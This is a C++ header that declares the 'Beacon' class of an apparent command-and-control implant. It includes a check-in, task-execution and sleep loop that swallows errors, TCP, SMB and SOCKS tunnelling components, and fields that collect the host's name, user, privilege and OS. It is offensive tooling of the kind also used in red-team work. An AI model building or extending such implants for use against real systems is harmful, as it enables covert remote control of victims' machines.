#pragma once

#include "../listener/ListenerTcp.hpp"
#include "../listener/ListenerSmb.hpp"
#include "SocksTunnelClient.hpp"

#ifdef __linux__
#elif _WIN32
#include <Windows.h>
#endif

#include <iostream>
#include <chrono>
#include <queue>
#include <mutex>

#include "Common.hpp"


class Beacon
{
public:
	Beacon(const std::string& ip, int port);
	virtual ~Beacon(){};

	void run()
	{
		bool exit = false;
		while (!exit)
		{
			try 
			{
				checkIn();

				exit = runTasks();
				
				sleep();
			}
			catch(const std::exception& ex)
			{
				// std::cout << "Exeption " << std::endl;
				// std::cout << "Exeption " << ex.what() << std::endl;
				sleep();
			}
			catch (...) 
			{
				// std::cout << "Exeption" << std::endl;
				sleep();
			}
		}

		checkIn();
	}

	virtual void  checkIn() = 0;
	bool runTasks();
	void sleep();

protected:
	bool execInstruction(C2Message& c2Message, C2Message& c2RetMessage);
	bool cmdToTasks(const std::string& input);
	bool taskResultsToCmd(std::string& output);

	std::string m_ip;
	int m_port;

	int m_aliveTimerMs;

	std::string m_beaconHash;
	std::string m_hostname;
	std::string m_username;
	std::string m_arch;
	std::string m_privilege;
	std::string m_os;

	std::queue<C2Message> m_tasks;
	std::queue<C2Message> m_taskResult;

private:
	std::string m_key;
	std::vector<std::unique_ptr<ModuleCmd>> m_moduleCmd;
	std::vector<std::unique_ptr<Listener>> m_listeners;
	std::vector<std::unique_ptr<SocksTunnelClient>> m_socksTunnelClient;

};
